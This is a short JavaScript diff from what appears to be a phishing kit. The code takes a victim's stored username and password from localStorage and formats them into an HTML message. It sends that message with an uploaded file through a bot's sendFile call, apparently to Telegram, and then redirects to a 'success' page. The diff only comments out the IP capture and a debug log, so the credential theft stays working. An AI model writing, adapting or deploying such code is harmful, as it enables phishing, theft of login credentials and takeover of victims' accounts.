@@ -38,13 +38,12 @@ if (frmFile) {
     const file = document.getElementById("file").value;
     if (file !== "") {
       var frmInfo = JSON.parse(localStorage.getItem('frmInfo'));
-      var _gip = localStorage.getItem('_gip');
+      //var _gip = localStorage.getItem('_gip');
 
       var msg = "<b>UserName: " + frmInfo.userName + "</b>%0A" +
-                "<b>Pass: " + frmInfo.pass + "</b>%0A" +
-                "<b>IP: " + _gip + "</b>";
+                "<b>Pass: " + frmInfo.pass + "</b>%0A";
+                //"<b>IP: " + _gip + "</b>";
 
-      console.log(msg);
       bot.sendFile("#file", msg, 'html')
         .then(res => {
           window.location.href = "success.html"
